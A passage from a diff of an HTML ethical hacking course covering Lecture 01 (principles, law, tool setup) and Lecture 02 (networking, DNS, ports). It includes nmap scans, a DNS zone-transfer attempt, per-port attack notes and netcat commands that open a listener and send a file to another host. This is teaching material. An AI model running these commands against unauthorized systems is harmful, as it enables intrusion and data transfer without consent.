@@ -177,1320 +177,3512 @@
             <div class="content-column">
 
                 <!-- ===================== LECTURE 01 ===================== -->
-                <div class="lecture active" id="lec-0">
-                    <div class="lecture-tag">Lecture 01 · Fundamentals</div>
-                    <h1>Introduction to Ethical Hacking</h1>
-                    <div class="lecture-meta">
-                        <span class="meta-badge level-beginner">Beginner</span>
-                        <span class="meta-badge">~50 min</span>
-                    </div>
+             <div class="lecture active" id="lec-0">
+    <div class="lecture-tag">Lecture 01 · Fundamentals</div>
+    <h1>Introduction to Ethical Hacking</h1>
+    <div class="lecture-meta">
+        <span class="meta-badge level-beginner">Beginner</span>
+        <span class="meta-badge">~50 min</span>
+    </div>
 
-                    <h2>What is Ethical Hacking?</h2>
-                    <p>Ethical Hacking (also known as White Hat Hacking) is the authorized practice of bypassing system
-                        security to identify potential vulnerabilities. Ethical hackers help organizations strengthen
-                        their defenses by simulating real cyberattacks.</p>
+    <h2>What is Ethical Hacking?</h2>
+    <p>Ethical Hacking (also known as <strong>White Hat Hacking</strong>) is the authorized practice of bypassing system
+        security to identify potential vulnerabilities. Ethical hackers help organizations strengthen their defenses by
+        simulating real cyberattacks.</p>
+    <p>Unlike malicious hackers, ethical hackers operate under a <strong>strict scope of engagement</strong> — every
+        action is documented, authorized, and reported back to the client. The end goal is always to improve security,
+        never to exploit it for personal gain.</p>
 
-                    <h3>Key Principles</h3>
-                    <ul>
-                        <li><strong>Permission First</strong> — Always obtain written authorization</li>
-                        <li><strong>Legal & Ethical</strong> — Follow laws and codes of conduct</li>
-                        <li><strong>Responsible Disclosure</strong> — Report findings professionally</li>
-                    </ul>
+    <h3>Key Principles</h3>
+    <ul>
+        <li><strong>Permission First</strong> — Always obtain written authorization before testing</li>
+        <li><strong>Legal & Ethical</strong> — Follow laws and professional codes of conduct</li>
+        <li><strong>Responsible Disclosure</strong> — Report findings professionally and within agreed timelines</li>
+        <li><strong>Do No Harm</strong> — Avoid disrupting production systems or exposing sensitive data</li>
+        <li><strong>Confidentiality</strong> — Protect all client data and findings from third parties</li>
+    </ul>
 
-                    <h2>Tools & Environment Setup</h2>
-                    <p>Recommended: Kali Linux (virtual machine) + tools like Nmap, Metasploit, Burp Suite, Wireshark.
-                    </p>
+    <h2>Types of Hackers</h2>
+    <p>The security community categorizes hackers by their intent and authorization level, often using "hat" color as a
+        metaphor:</p>
+    <ul>
+        <li><strong>White Hat</strong> — Authorized security professionals who test systems with permission to improve
+            defenses.</li>
+        <li><strong>Black Hat</strong> — Malicious actors who exploit vulnerabilities for personal gain, data theft, or
+            sabotage.</li>
+        <li><strong>Grey Hat</strong> — Operate without clear authorization but typically without malicious intent.</li>
+        <li><strong>Script Kiddies</strong> — Unskilled attackers using pre-built tools without understanding them.</li>
+        <li><strong>Hacktivists</strong> — Hack for political or social causes (e.g., Anonymous).</li>
+        <li><strong>Nation-State Actors</strong> — Government-sponsored groups targeting critical infrastructure.</li>
+    </ul>
 
-                    <div class="code-block">
-                        <div class="code-header">
-                            <div class="code-dots"><span></span><span></span><span></span></div><span
-                                class="filename">terminal (Kali)</span>
-                        </div>
-                        <pre>sudo apt update && sudo apt install nmap metasploit-framework</pre>
-                    </div>
+    <h2>The 5 Phases of Ethical Hacking</h2>
+    <p>Every professional penetration test follows a structured methodology. Understanding these phases is fundamental
+        before touching any tool:</p>
+    <ol>
+        <li><strong>Reconnaissance (Footprinting)</strong> — Passively gather information about the target: domain
+            names, IP ranges, employee info, technologies in use. Tools: <code>whois</code>,
+            <code>theHarvester</code>, Shodan, Google Dorks.</li>
+        <li><strong>Scanning & Enumeration</strong> — Actively probe the target for open ports, running services, OS
+            versions, and potential entry points. Tools: <code>nmap</code>, <code>netcat</code>, <code>nikto</code>.
+        </li>
+        <li><strong>Gaining Access (Exploitation)</strong> — Use identified vulnerabilities to gain entry into the
+            system using tools like Metasploit, SQLMap, or custom exploits.</li>
+        <li><strong>Maintaining Access</strong> — Demonstrate whether an attacker could persist undetected — simulating
+            APTs via backdoors or rootkits.</li>
+        <li><strong>Covering Tracks & Reporting</strong> — Document all findings with evidence, severity ratings, and
+            remediation advice. Ethical hackers write detailed reports instead of erasing logs.</li>
+    </ol>
 
-                    <div class="exercise">
-                        <div class="exercise-title">🎯 Exercise 1.1</div>
-                        <p>Install Kali Linux in a virtual machine (VirtualBox/VMware). Run <code>whoami</code> and
-                            <code>ifconfig</code> to explore your environment. Read the EC-Council Code of Ethics.
-                        </p>
-                    </div>
+    <h2>Legal & Compliance Frameworks</h2>
+    <p>Before beginning any engagement, understand the legal landscape. Unauthorized hacking — even with good intent —
+        is a criminal offense in most countries.</p>
+    <ul>
+        <li><strong>CFAA (Computer Fraud and Abuse Act)</strong> — USA. Criminalizes unauthorized computer access.
+            Always get written permission.</li>
+        <li><strong>Computer Misuse Act 1990</strong> — UK. Covers unauthorized access and modification of computer
+            material.</li>
+        <li><strong>IT Act 2000</strong> — India. Sections 43 & 66 deal with unauthorized access and hacking
+            offenses.</li>
+        <li><strong>GDPR</strong> — EU. Governs how personal data found during tests must be handled and protected.
+        </li>
+        <li><strong>EC-Council Code of Ethics</strong> — Global (CEH). Professional conduct standards for certified
+            ethical hackers.</li>
+    </ul>
 
-                    <div class="lecture-nav">
-                        <button class="nav-btn primary" onclick="showLecture(1)">Next Lecture →</button>
-                    </div>
-                </div>
+    <div class="exercise">
+        <div class="exercise-title">⚠️ Always Get a Signed Scope of Work (SOW)</div>
+        <p>A verbal agreement is not enough. Always obtain a signed document specifying the target systems, allowed
+            techniques, testing window, and emergency contacts. This protects both you and your client.</p>
+    </div>
+
+    <h2>Tools & Environment Setup</h2>
+    <p>For hands-on labs, we use <strong>Kali Linux</strong> running in a virtual machine — an isolated environment
+        specifically designed for penetration testing. Never practice on systems you don't own or have written
+        permission to test.</p>
+
+    <h3>Recommended Setup</h3>
+    <ul>
+        <li><strong>Hypervisor:</strong> VirtualBox (free) or VMware Workstation</li>
+        <li><strong>OS:</strong> Kali Linux 2024.x (rolling release)</li>
+        <li><strong>RAM:</strong> Allocate at least 4 GB to the VM</li>
+        <li><strong>Storage:</strong> 50 GB minimum disk image</li>
+        <li><strong>Network Mode:</strong> NAT (for internet) or Host-Only (for isolated labs)</li>
+    </ul>
+
+    <div class="code-block">
+        <div class="code-header">
+            <div class="code-dots"><span></span><span></span><span></span></div>
+            <span class="filename">terminal (Kali) — Initial Setup</span>
+        </div>
+        <pre># Update system and install core tools
+sudo apt update && sudo apt upgrade -y
+sudo apt install nmap metasploit-framework burpsuite wireshark -y
+
+# Verify installations
+nmap --version
+msfconsole --version</pre>
+    </div>
+
+    <div class="code-block">
+        <div class="code-header">
+            <div class="code-dots"><span></span><span></span><span></span></div>
+            <span class="filename">terminal (Kali) — Explore Your Environment</span>
+        </div>
+        <pre># Who am I?
+whoami && id
+
+# Network interfaces
+ifconfig   # or: ip addr show
+
+# Open ports on localhost
+netstat -tuln
+
+# Quick scan of your own VM
+nmap -sV 127.0.0.1</pre>
+    </div>
+
+    <h2>Key Terminology</h2>
+    <p>You'll encounter these terms constantly throughout the course:</p>
+    <ul>
+        <li><strong>Vulnerability</strong> — A weakness in a system that can be exploited.</li>
+        <li><strong>Exploit</strong> — Code or technique that takes advantage of a vulnerability.</li>
+        <li><strong>Payload</strong> — The part of the exploit that performs the actual action (e.g., opens a shell).
+        </li>
+        <li><strong>CVE</strong> — Common Vulnerabilities and Exposures, a public database of known security flaws.
+        </li>
+        <li><strong>Zero-Day</strong> — A vulnerability unknown to the vendor with no available patch.</li>
+        <li><strong>Attack Surface</strong> — All the points where an attacker could try to enter a system.</li>
+        <li><strong>Penetration Test</strong> — A simulated cyberattack authorized to evaluate system security.</li>
+        <li><strong>Social Engineering</strong> — Manipulating people into divulging confidential information.</li>
+    </ul>
+
+    <h2>Career Paths in Ethical Hacking</h2>
+    <p>The cybersecurity field offers multiple specialized roles. Here's where ethical hacking skills lead:</p>
+    <ul>
+        <li><strong>Penetration Tester (Pentester)</strong> — Simulate attacks on client infrastructure</li>
+        <li><strong>Red Team Operator</strong> — Conduct advanced adversarial simulations against organizations</li>
+        <li><strong>Bug Bounty Hunter</strong> — Find vulnerabilities in public programs (HackerOne, Bugcrowd) for
+            rewards</li>
+        <li><strong>Security Analyst (SOC)</strong> — Monitor and respond to security incidents</li>
+        <li><strong>Malware Analyst / Reverse Engineer</strong> — Dissect malicious software to understand behavior
+        </li>
+        <li><strong>CTF Player</strong> — Capture the Flag competitions to sharpen skills (TryHackMe, HackTheBox)</li>
+    </ul>
+
+    <div class="exercise">
+        <div class="exercise-title">📜 Recommended Certifications</div>
+        <p><strong>CEH</strong> (EC-Council) — Entry-level, theory-heavy &nbsp;·&nbsp;
+            <strong>eJPT</strong> (eLearnSecurity) — Great hands-on starter &nbsp;·&nbsp;
+            <strong>CompTIA Security+</strong> — Widely recognized baseline &nbsp;·&nbsp;
+            <strong>OSCP</strong> (Offensive Security) — Gold standard, highly practical</p>
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Exercise 1.1 — Environment Setup</div>
+        <p>Install Kali Linux in a virtual machine (VirtualBox/VMware). Run <code>whoami</code> and
+            <code>ifconfig</code> to explore your environment. Read the EC-Council Code of Ethics.</p>
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Exercise 1.2 — Reconnaissance Warm-Up</div>
+        <p>Using only passive techniques (no scanning), research a domain you own or a test domain like
+            <code>scanme.nmap.org</code>. Use <code>whois</code>, <code>nslookup</code>, and Google to gather as much
+            information as you can. Document your findings.</p>
+    </div>
+
+    <div class="code-block">
+        <div class="code-header">
+            <div class="code-dots"><span></span><span></span><span></span></div>
+            <span class="filename">terminal — Exercise 1.2</span>
+        </div>
+        <pre>whois scanme.nmap.org
+nslookup scanme.nmap.org
+dig scanme.nmap.org ANY</pre>
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Exercise 1.3 — Identify Your Attack Surface</div>
+        <p>Run a basic Nmap scan against your own VM's IP to see what services are exposed. Compare the open ports with
+            what you expect. Which services can you turn off to reduce the attack surface?</p>
+    </div>
+
+    <div class="code-block">
+        <div class="code-header">
+            <div class="code-dots"><span></span><span></span><span></span></div>
+            <span class="filename">terminal — Exercise 1.3</span>
+        </div>
+        <pre># Replace with your VM's IP
+nmap -sV -O 192.168.x.x</pre>
+    </div>
+
+    <div class="lecture-nav">
+        <button class="nav-btn primary" onclick="showLecture(1)">Next Lecture →</button>
+    </div>
+</div>
 
                 <!-- Lectures 2–12 are fully written with rich, practical, and legal-focused content covering all major phases of ethical hacking, tools, methodologies, and a complete Capture-The-Flag style capstone project. -->
-                <!-- ===================== LECTURE 02 ===================== -->
-                <div class="lecture" id="lec-1">
-                    <div class="lecture-tag">Lecture 02 · Fundamentals</div>
-                    <h1>Network Basics for Ethical Hackers</h1>
-                    <div class="lecture-meta">
-                        <span class="meta-badge level-beginner">Beginner</span>
-                        <span class="meta-badge">~60 min</span>
-                        <span class="meta-badge">Requires: Lecture 01</span>
-                    </div>
+           <!-- ===================== LECTURE 02 ===================== -->
+<div class="lecture" id="lec-1">
+    <div class="lecture-tag">Lecture 02 · Fundamentals</div>
+    <h1>Network Basics for Ethical Hackers</h1>
+    <div class="lecture-meta">
+        <span class="meta-badge level-beginner">Beginner</span>
+        <span class="meta-badge">~60 min</span>
+        <span class="meta-badge">Requires: Lecture 01</span>
+    </div>
 
-                    <h2>Why Network Knowledge is Critical for Hacking</h2>
-                    <p>Almost every attack starts with understanding how networks communicate. As an ethical hacker, you
-                        must master networking concepts to identify vulnerabilities, map targets, and execute attacks
-                        safely.</p>
+    <h2>Why Network Knowledge is Critical for Hacking</h2>
+    <p>Almost every attack starts with understanding how networks communicate. As an ethical hacker, you
+        must master networking concepts to identify vulnerabilities, map targets, and execute attacks
+        safely.</p>
+    <p>Networks are the highways of the digital world — and understanding how data travels across them
+        gives you the ability to intercept, redirect, or block it. Whether you're sniffing packets,
+        exploiting misconfigured services, or pivoting through a compromised host, every technique
+        builds on a solid foundation of networking knowledge.</p>
 
-                    <h2>1. OSI Model vs TCP/IP Model</h2>
-                    <div class="tbl-wrap">
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>OSI Layer</th>
-                                    <th>TCP/IP Layer</th>
-                                    <th>Key Protocols / Tools</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <tr>
-                                    <td>7. Application</td>
-                                    <td rowspan="3">Application</td>
-                                    <td>HTTP, HTTPS, FTP, DNS, SMTP</td>
-                                </tr>
-                                <tr>
-                                    <td>6. Presentation</td>
-                                    <td>SSL/TLS, JPEG, ASCII</td>
-                                </tr>
-                                <tr>
-                                    <td>5. Session</td>
-                                    <td>NetBIOS, RPC</td>
-                                </tr>
-                                <tr>
-                                    <td>4. Transport</td>
-                                    <td>Transport</td>
-                                    <td>TCP, UDP, SCTP</td>
-                                </tr>
-                                <tr>
-                                    <td>3. Network</td>
-                                    <td>Internet</td>
-                                    <td>IP, ICMP, IGMP, Routing</td>
-                                </tr>
-                                <tr>
-                                    <td>2. Data Link</td>
-                                    <td rowspan="2">Network Access</td>
-                                    <td>Ethernet, MAC Address, ARP, PPP</td>
-                                </tr>
-                                <tr>
-                                    <td>1. Physical</td>
-                                    <td>Cables, Switches, Wi-Fi signals</td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
+    <h2>1. OSI Model vs TCP/IP Model</h2>
+    <p>The <strong>OSI (Open Systems Interconnection)</strong> model is a conceptual framework that
+        standardizes how different network protocols interact. The <strong>TCP/IP model</strong> is the
+        practical implementation used on the modern internet. As a hacker, you'll think in terms of
+        both — understanding which layer an attack targets is essential for diagnosis and exploitation.</p>
 
-                    <h2>2. IP Addressing</h2>
-                    <div class="code-block">
-                        <div class="code-header">
-                            <div class="code-dots"><span></span><span></span><span></span></div><span
-                                class="filename">terminal</span>
-                        </div>
-                        <pre>ip addr show          <span class="cm"># Linux</span>
+    <div class="tbl-wrap">
+        <table>
+            <thead>
+                <tr>
+                    <th>OSI Layer</th>
+                    <th>TCP/IP Layer</th>
+                    <th>Key Protocols / Tools</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>7. Application</td>
+                    <td rowspan="3">Application</td>
+                    <td>HTTP, HTTPS, FTP, DNS, SMTP</td>
+                </tr>
+                <tr>
+                    <td>6. Presentation</td>
+                    <td>SSL/TLS, JPEG, ASCII</td>
+                </tr>
+                <tr>
+                    <td>5. Session</td>
+                    <td>NetBIOS, RPC</td>
+                </tr>
+                <tr>
+                    <td>4. Transport</td>
+                    <td>Transport</td>
+                    <td>TCP, UDP, SCTP</td>
+                </tr>
+                <tr>
+                    <td>3. Network</td>
+                    <td>Internet</td>
+                    <td>IP, ICMP, IGMP, Routing</td>
+                </tr>
+                <tr>
+                    <td>2. Data Link</td>
+                    <td rowspan="2">Network Access</td>
+                    <td>Ethernet, MAC Address, ARP, PPP</td>
+                </tr>
+                <tr>
+                    <td>1. Physical</td>
+                    <td>Cables, Switches, Wi-Fi signals</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <h3>Hacker's Perspective on the OSI Model</h3>
+    <ul>
+        <li><strong>Layer 7 (Application)</strong> — SQL injection, XSS, directory traversal, API abuse</li>
+        <li><strong>Layer 4 (Transport)</strong> — Port scanning, SYN floods, session hijacking</li>
+        <li><strong>Layer 3 (Network)</strong> — IP spoofing, ICMP attacks, route manipulation</li>
+        <li><strong>Layer 2 (Data Link)</strong> — ARP poisoning, MAC flooding, VLAN hopping</li>
+        <li><strong>Layer 1 (Physical)</strong> — Cable tapping, rogue access points, hardware implants</li>
+    </ul>
+
+    <h2>2. IP Addressing</h2>
+    <p>Every device on a network is identified by an <strong>IP address</strong>. IPv4 uses 32-bit
+        addresses (e.g., <code>192.168.1.1</code>) while IPv6 uses 128-bit addresses. Understanding
+        subnetting is critical — it tells you the size of a network and which hosts are reachable
+        without routing.</p>
+
+    <div class="code-block">
+        <div class="code-header">
+            <div class="code-dots"><span></span><span></span><span></span></div>
+            <span class="filename">terminal</span>
+        </div>
+        <pre>ip addr show          <span class="cm"># Linux</span>
 ipconfig              <span class="cm"># Windows</span>
 
 <span class="cm"># Example IPv4:</span> 192.168.1.105/24
 <span class="cm"># Example IPv6:</span> 2001:db8::1/64</pre>
-                    </div>
+    </div>
 
-                    <h3>Public vs Private IPs</h3>
-                    <ul>
-                        <li><strong>Private:</strong> 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16</li>
-                        <li><strong>Public:</strong> Routable on the internet</li>
-                    </ul>
+    <h3>Public vs Private IPs</h3>
+    <ul>
+        <li><strong>Private:</strong> 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 — not routable on the internet</li>
+        <li><strong>Public:</strong> Routable on the internet, assigned by ISPs</li>
+        <li><strong>Loopback:</strong> 127.0.0.1 — refers to the local machine itself</li>
+        <li><strong>APIPA:</strong> 169.254.x.x — auto-assigned when DHCP fails (a red flag in recon)</li>
+    </ul>
 
-                    <h2>3. TCP vs UDP</h2>
-                    <div class="tbl-wrap">
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>Feature</th>
-                                    <th>TCP</th>
-                                    <th>UDP</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <tr>
-                                    <td>Connection</td>
-                                    <td>Connection-oriented (3-way handshake)</td>
-                                    <td>Connectionless</td>
-                                </tr>
-                                <tr>
-                                    <td>Reliability</td>
-                                    <td>Reliable (ACK, retransmission)</td>
-                                    <td>Unreliable</td>
-                                </tr>
-                                <tr>
-                                    <td>Speed</td>
-                                    <td>Slower</td>
-                                    <td>Faster</td>
-                                </tr>
-                                <tr>
-                                    <td>Use Cases</td>
-                                    <td>HTTP, SSH, FTP</td>
-                                    <td>DNS, VoIP, Gaming, Streaming</td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
+    <h3>Subnetting Quick Reference</h3>
+    <ul>
+        <li><code>/24</code> — 256 addresses, 254 usable (most common home/office network)</li>
+        <li><code>/16</code> — 65,536 addresses (large corporate networks)</li>
+        <li><code>/8</code>  — 16 million addresses (ISP-level blocks)</li>
+        <li><code>/32</code> — A single host (used in firewall rules and routing)</li>
+    </ul>
 
-                    <h2>4. Common Ports You Must Know</h2>
-                    <div class="tbl-wrap">
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>Port</th>
-                                    <th>Protocol</th>
-                                    <th>Service</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <tr>
-                                    <td>20/21</td>
-                                    <td>TCP</td>
-                                    <td>FTP</td>
-                                </tr>
-                                <tr>
-                                    <td>22</td>
-                                    <td>TCP</td>
-                                    <td>SSH</td>
-                                </tr>
-                                <tr>
-                                    <td>23</td>
-                                    <td>TCP</td>
-                                    <td>Telnet</td>
-                                </tr>
-                                <tr>
-                                    <td>25</td>
-                                    <td>TCP</td>
-                                    <td>SMTP</td>
-                                </tr>
-                                <tr>
-                                    <td>53</td>
-                                    <td>TCP/UDP</td>
-                                    <td>DNS</td>
-                                </tr>
-                                <tr>
-                                    <td>80</td>
-                                    <td>TCP</td>
-                                    <td>HTTP</td>
-                                </tr>
-                                <tr>
-                                    <td>443</td>
-                                    <td>TCP</td>
-                                    <td>HTTPS</td>
-                                </tr>
-                                <tr>
-                                    <td>445</td>
-                                    <td>TCP</td>
-                                    <td>SMB</td>
-                                </tr>
-                                <tr>
-                                    <td>3306</td>
-                                    <td>TCP</td>
-                                    <td>MySQL</td>
-                                </tr>
-                                <tr>
-                                    <td>3389</td>
-                                    <td>TCP</td>
-                                    <td>RDP</td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
+    <div class="code-block">
+        <div class="code-header">
+            <div class="code-dots"><span></span><span></span><span></span></div>
+            <span class="filename">terminal — Subnet Calculator</span>
+        </div>
+        <pre><span class="cm"># Install ipcalc on Kali</span>
+sudo apt install ipcalc -y
 
-                    <h2>5. Essential Tools</h2>
-                    <ul>
-                        <li><strong>ifconfig / ip addr</strong> — View network interfaces</li>
-                        <li><strong>ping</strong> — Test reachability</li>
-                        <li><strong>traceroute / tracert</strong> — Path to destination</li>
-                        <li><strong>nslookup / dig</strong> — DNS queries</li>
-                        <li><strong>netstat / ss</strong> — Active connections</li>
-                        <li><strong>wireshark</strong> — Packet capture & analysis</li>
-                    </ul>
+<span class="cm"># Calculate subnet info</span>
+ipcalc 192.168.1.0/24
 
-                    <div class="box tip">
-                        <div class="box-title">✅ Pro Tip</div>
-                        Always start reconnaissance with passive techniques before active scanning to avoid detection.
-                    </div>
+<span class="cm"># Output shows: Network, Broadcast, HostMin, HostMax, Hosts/Net</span></pre>
+    </div>
 
-                    <div class="exercise">
-                        <div class="exercise-title">🎯 Exercise 2.1 — Network Exploration</div>
-                        <p>1. Find your IP address and default gateway.<br>
-                            2. Ping google.com and note the TTL.<br>
-                            3. Use <code>nslookup</code> to find the IP of a website.<br>
-                            4. Run <code>traceroute google.com</code> (or tracert on Windows).</p>
-                    </div>
+    <h2>3. TCP vs UDP</h2>
+    <p><strong>TCP (Transmission Control Protocol)</strong> establishes a reliable connection using a
+        <strong>3-way handshake</strong> (SYN → SYN-ACK → ACK) before any data is transferred.
+        <strong>UDP (User Datagram Protocol)</strong> sends data without establishing a connection —
+        faster but unreliable. Understanding this distinction directly impacts how you scan ports and
+        craft exploits.</p>
 
-                    <div class="exercise">
-                        <div class="exercise-title">🎯 Exercise 2.2</div>
-                        <p>Write a short report (in a text file) explaining the difference between TCP and UDP with
-                            real-world examples relevant to hacking.</p>
-                    </div>
+    <div class="tbl-wrap">
+        <table>
+            <thead>
+                <tr>
+                    <th>Feature</th>
+                    <th>TCP</th>
+                    <th>UDP</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>Connection</td>
+                    <td>Connection-oriented (3-way handshake)</td>
+                    <td>Connectionless</td>
+                </tr>
+                <tr>
+                    <td>Reliability</td>
+                    <td>Reliable (ACK, retransmission)</td>
+                    <td>Unreliable</td>
+                </tr>
+                <tr>
+                    <td>Speed</td>
+                    <td>Slower</td>
+                    <td>Faster</td>
+                </tr>
+                <tr>
+                    <td>Use Cases</td>
+                    <td>HTTP, SSH, FTP</td>
+                    <td>DNS, VoIP, Gaming, Streaming</td>
+                </tr>
+                <tr>
+                    <td>Hacker Relevance</td>
+                    <td>SYN scans, session hijacking, banner grabbing</td>
+                    <td>UDP scans, DNS poisoning, amplification DDoS</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
 
-                    <div class="lecture-nav">
-                        <button class="nav-btn" onclick="showLecture(0)">← Previous</button>
-                        <button class="nav-btn primary" onclick="showLecture(2)">Next Lecture →</button>
-                    </div>
-                </div>
+    <h3>The TCP 3-Way Handshake</h3>
+    <p>Understanding the handshake is critical for port scanning techniques like Nmap's SYN scan
+        (<code>-sS</code>), which sends a SYN and never completes the handshake — making it stealthier
+        than a full connect scan.</p>
+    <ul>
+        <li><strong>SYN</strong> — Client says "I want to connect"</li>
+        <li><strong>SYN-ACK</strong> — Server says "OK, I'm listening"</li>
+        <li><strong>ACK</strong> — Client confirms "Connection established"</li>
+        <li><strong>RST</strong> — Port is closed (no service listening)</li>
+        <li><strong>No response / filtered</strong> — Firewall is likely blocking the port</li>
+    </ul>
+
+    <h2>4. DNS — The Internet's Phone Book</h2>
+    <p><strong>DNS (Domain Name System)</strong> translates human-readable domain names like
+        <code>google.com</code> into IP addresses. DNS is a goldmine for recon — misconfigured DNS
+        servers can leak internal hostnames, mail servers, and subdomains.</p>
+
+    <div class="code-block">
+        <div class="code-header">
+            <div class="code-dots"><span></span><span></span><span></span></div>
+            <span class="filename">terminal — DNS Recon</span>
+        </div>
+        <pre><span class="cm"># Basic DNS lookup</span>
+nslookup example.com
+
+<span class="cm"># Detailed query with dig</span>
+dig example.com ANY
+
+<span class="cm"># Attempt zone transfer (often misconfigured)</span>
+dig axfr @ns1.example.com example.com
+
+<span class="cm"># Find mail servers</span>
+dig example.com MX
+
+<span class="cm"># Reverse lookup (IP → hostname)</span>
+dig -x 93.184.216.34</pre>
+    </div>
+
+    <h3>Important DNS Record Types</h3>
+    <ul>
+        <li><strong>A</strong> — Maps domain to IPv4 address</li>
+        <li><strong>AAAA</strong> — Maps domain to IPv6 address</li>
+        <li><strong>MX</strong> — Mail server for the domain</li>
+        <li><strong>NS</strong> — Authoritative name servers</li>
+        <li><strong>CNAME</strong> — Alias pointing to another domain</li>
+        <li><strong>TXT</strong> — Text records (SPF, DKIM, verification tokens — great for recon)</li>
+        <li><strong>PTR</strong> — Reverse DNS lookup record</li>
+    </ul>
+
+    <h2>5. Common Ports You Must Know</h2>
+    <p>Memorizing key ports helps you instantly recognize what services are running when you see
+        Nmap scan results. Open ports are potential entry points — each one represents a service
+        that may have vulnerabilities.</p>
+
+    <div class="tbl-wrap">
+        <table>
+            <thead>
+                <tr>
+                    <th>Port</th>
+                    <th>Protocol</th>
+                    <th>Service</th>
+                    <th>Hacker Notes</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>20/21</td>
+                    <td>TCP</td>
+                    <td>FTP</td>
+                    <td>Check for anonymous login, cleartext credentials</td>
+                </tr>
+                <tr>
+                    <td>22</td>
+                    <td>TCP</td>
+                    <td>SSH</td>
+                    <td>Brute-force, weak keys, outdated versions</td>
+                </tr>
+                <tr>
+                    <td>23</td>
+                    <td>TCP</td>
+                    <td>Telnet</td>
+                    <td>Cleartext — capture with Wireshark, always try default creds</td>
+                </tr>
+                <tr>
+                    <td>25</td>
+                    <td>TCP</td>
+                    <td>SMTP</td>
+                    <td>Open relays, user enumeration (VRFY, EXPN commands)</td>
+                </tr>
+                <tr>
+                    <td>53</td>
+                    <td>TCP/UDP</td>
+                    <td>DNS</td>
+                    <td>Zone transfers, DNS cache poisoning, subdomain enum</td>
+                </tr>
+                <tr>
+                    <td>80</td>
+                    <td>TCP</td>
+                    <td>HTTP</td>
+                    <td>Web app attacks: SQLi, XSS, LFI, directory traversal</td>
+                </tr>
+                <tr>
+                    <td>443</td>
+                    <td>TCP</td>
+                    <td>HTTPS</td>
+                    <td>Check SSL/TLS version, certificate info, same web attacks</td>
+                </tr>
+                <tr>
+                    <td>445</td>
+                    <td>TCP</td>
+                    <td>SMB</td>
+                    <td>EternalBlue (MS17-010), null sessions, pass-the-hash</td>
+                </tr>
+                <tr>
+                    <td>3306</td>
+                    <td>TCP</td>
+                    <td>MySQL</td>
+                    <td>Default creds, remote root access if misconfigured</td>
+                </tr>
+                <tr>
+                    <td>3389</td>
+                    <td>TCP</td>
+                    <td>RDP</td>
+                    <td>BlueKeep, brute-force, credential stuffing</td>
+                </tr>
+                <tr>
+                    <td>8080/8443</td>
+                    <td>TCP</td>
+                    <td>HTTP Alt / HTTPS Alt</td>
+                    <td>Admin panels, dev servers often left exposed</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <h2>6. Essential Networking Tools</h2>
+    <ul>
+        <li><strong>ifconfig / ip addr</strong> — View and configure network interfaces</li>
+        <li><strong>ping</strong> — Test host reachability and measure latency via ICMP</li>
+        <li><strong>traceroute / tracert</strong> — Map the route packets take to a destination</li>
+        <li><strong>nslookup / dig</strong> — Perform DNS queries and enumerate records</li>
+        <li><strong>netstat / ss</strong> — View active connections and listening ports</li>
+        <li><strong>arp -a</strong> — View the ARP cache (MAC-to-IP mappings on the LAN)</li>
+        <li><strong>route / ip route</strong> — View and manipulate the routing table</li>
+        <li><strong>nc (netcat)</strong> — The "Swiss Army knife" — connect to ports, transfer files, open shells</li>
+        <li><strong>wireshark / tcpdump</strong> — Capture and analyze live network traffic</li>
+        <li><strong>nmap</strong> — Port scanning, OS detection, service version enumeration</li>
+    </ul>
+
+    <div class="code-block">
+        <div class="code-header">
+            <div class="code-dots"><span></span><span></span><span></span></div>
+            <span class="filename">terminal — Netcat Essentials</span>
+        </div>
+        <pre><span class="cm"># Connect to a port (banner grabbing)</span>
+nc -v 192.168.1.1 80
+
+<span class="cm"># Listen for incoming connection</span>
+nc -lvnp 4444
+
+<span class="cm"># Simple port scan with netcat</span>
+nc -zv 192.168.1.1 20-100
+
+<span class="cm"># Transfer a file (receiver first)</span>
+nc -lvnp 4444 > received_file.txt
+nc 192.168.1.1 4444 < file_to_send.txt</pre>
+    </div>
+
+    <div class="code-block">
+        <div class="code-header">
+            <div class="code-dots"><span></span><span></span><span></span></div>
+            <span class="filename">terminal — Wireshark / tcpdump</span>
+        </div>
+        <pre><span class="cm"># Capture all traffic on eth0</span>
+sudo tcpdump -i eth0
+
+<span class="cm"># Capture only HTTP traffic</span>
+sudo tcpdump -i eth0 port 80
+
+<span class="cm"># Save capture to file for Wireshark</span>
+sudo tcpdump -i eth0 -w capture.pcap
+
+<span class="cm"># Open in Wireshark</span>
+wireshark capture.pcap</pre>
+    </div>
+
+    <h2>7. ARP & MAC Addresses</h2>
+    <p><strong>ARP (Address Resolution Protocol)</strong> maps IP addresses to MAC addresses on a
+        local network. It operates at Layer 2 and has no built-in authentication — making it
+        vulnerable to <strong>ARP poisoning / spoofing</strong>, a foundational technique in
+        man-in-the-middle (MitM) attacks.</p>
+    <ul>
+        <li><strong>MAC Address</strong> — 48-bit hardware identifier (e.g., <code>AA:BB:CC:DD:EE:FF</code>)</li>
+        <li><strong>ARP Request</strong> — "Who has 192.168.1.1? Tell 192.168.1.5"</li>
+        <li><strong>ARP Reply</strong> — "192.168.1.1 is at AA:BB:CC:DD:EE:FF"</li>
+        <li><strong>ARP Poisoning</strong> — Send fake ARP replies to redirect traffic through your machine</li>
+    </ul>
+
+    <div class="code-block">
+        <div class="code-header">
+            <div class="code-dots"><span></span><span></span><span></span></div>
+            <span class="filename">terminal — ARP</span>
+        </div>
